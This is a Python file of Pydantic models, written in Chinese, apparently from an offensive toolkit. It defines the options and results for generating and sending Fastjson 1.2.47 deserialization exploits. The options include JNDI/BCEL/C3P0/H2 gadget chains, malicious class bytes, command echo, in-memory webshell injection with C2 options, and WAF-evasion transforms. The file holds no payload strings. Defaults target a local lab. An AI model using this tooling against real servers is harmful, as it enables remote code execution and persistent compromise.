"""Fastjson 1.2.47 PoC 结构化输入/输出。"""

from __future__ import annotations

from typing import Any, Literal, Optional

from pydantic import BaseModel, Field

from fastjson_toolkit.waf.models import WafOptions

EchoEngineField = Literal[
    "auto",
    "spring",
    "undertow",
    "tomcat",
    "jetty",
    "weblogic",
    "websphere",
    "resin",
    "struts2",
    "httpserver",
    "dfs",
]



class Poc1247GenerateOptions(BaseModel):
    """生成 ≤1.2.47 证明 payload。"""

    gadget: str = Field(
        "jdbc_rowset",
        description=(
            "jdbc_rowset / bcel_tomcat_dbcp / bcel_tomcat_dbcp2 / "
            "bcel_commons_dbcp / bcel_commons_dbcp2 / c3p0_wrapper / "
            "mybatis_bcel / h2_jdbc"
        ),
    )
    jndi_url: Optional[str] = Field(
        "ldap://127.0.0.1:1389/Exploit",
        description="JdbcRowSetImpl dataSourceName",
    )
    bcel_code: Optional[str] = Field(
        None, description="$$BCEL$$... 或裸编码；与 class_b64 二选一"
    )
    class_b64: Optional[str] = Field(
        None, description="恶意 .class 的 Base64（BCEL / H2 可用）"
    )
    user_overrides: Optional[str] = Field(
        None, description="C3P0 HexAsciiSerializedMap:...;"
    )
    serialized_b64: Optional[str] = Field(
        None, description="二次反序列化 gadget 字节的 Base64（自动转 HexAscii）"
    )
    h2_url: Optional[str] = Field(
        None, description="完整 H2 JDBC URL；空则由 class_b64 自动拼 INIT"
    )
    getter_trigger: str = Field(
        "ref",
        description=(
            "getter 触发：ref（默认 $ref）/ json_key（JSONObject 作 Map key）/ "
            "currency（有期望类时套 Currency）/ currency_json_key（java-chains）"
        ),
    )
    currency_field: str = Field(
        "currency",
        description="Currency MiscCodec 字段名：currency 或 currencyCode",
    )
    json_key_with_type: bool = Field(
        True,
        description="json_key 形态是否带 @type=JSONObject（false 时 {} 默认为 JSONObject）",
    )
    json_key_as_array: bool = Field(
        False,
        description="json_key 最外层改为 JSONArray 作 key（[{...}]:{}）",
    )
    echo: bool = Field(False, description="BCEL/H2/MyBatis 自动生成回显类")
    engine: EchoEngineField = Field("auto", description="回显引擎")
    cmd: str = Field("id", description="回显默认命令")
    cmd_header: str = Field("X-Cmd", description="命令请求头")
    memshell: bool = Field(False, description="注入内存马（与 echo 互斥）")
    ms_api: str = Field(
        "jar",
        description="jar=内置 memshell-gen.jar；或 http(s)://... MemShellParty boot",
    )
    ms_server: str = Field("Undertow", description="中间件类型")
    ms_tool: str = Field("Command", description="C2/管理工具")
    ms_type: str = Field("Filter", description="马类型 Filter/Listener/...")
    ms_path: str = Field("/*", description="urlPattern")
    ms_jdk: str = Field("8", description="目标 JDK 大版本：6/8/9/11/17/21")
    waf_techniques: list[str] = Field(
        default_factory=list,
        description="生成后按顺序叠加的 WAF 变换 id（见 GET /api/waf/techniques）",
    )
    waf_options: Optional[WafOptions] = Field(
        None, description="WAF 变换参数（逗号数/填充长度等）"
    )


class Poc1247GenerateResult(BaseModel):
    ok: bool = True
    gadget: str
    title: str = ""
    payload: str
    payload_raw: Optional[str] = Field(
        None, description="WAF 变换前的原始 payload；未变换时为 null"
    )
    getter_trigger: str = "ref"
    waf_techniques: list[str] = Field(default_factory=list)
    notes: list[str] = Field(default_factory=list)
    requires: list[str] = Field(default_factory=list)
    jdk: str = ""
    echo: bool = False
    engine: str = ""
    cmd_header: str = ""
    class_b64: Optional[str] = None
    bcel_code: Optional[str] = None
    memshell: bool = False
    memshell_info: Optional[dict] = None
    memshell_connect: Optional[str] = None


class Poc1247SendOptions(Poc1247GenerateOptions):
    """生成并（可选）发送到目标。"""

    target: str = Field(
        "http://127.0.0.1:18247/api/fastjson",
        description="反序列化点 URL（默认版本靶场 1.2.47）",
    )
    send: bool = Field(False, description="是否 POST payload 到 target")
    timeout: float = Field(10.0, ge=1, le=120)
    headers: dict[str, str] = Field(default_factory=dict)
    proxy: Optional[str] = None
    insecure: bool = False
    content_type: str = "application/json"


class Poc1247SendResult(BaseModel):
    ok: bool
    gadget: str
    title: str = ""
    payload: str
    payload_raw: Optional[str] = None
    getter_trigger: str = "ref"
    waf_techniques: list[str] = Field(default_factory=list)
    sent: bool = False
    status_code: Optional[int] = None
    response_preview: str = ""
    summary: str = ""
    notes: list[str] = Field(default_factory=list)
    requires: list[str] = Field(default_factory=list)
    jdk: str = ""
    echo: bool = False
    engine: str = ""
    cmd_header: str = ""
    class_b64: Optional[str] = None
    bcel_code: Optional[str] = None
    echo_output: Optional[str] = None
    memshell: bool = False
    memshell_info: Optional[dict] = None
    memshell_connect: Optional[str] = None
    raw: dict[str, Any] = Field(default_factory=dict)
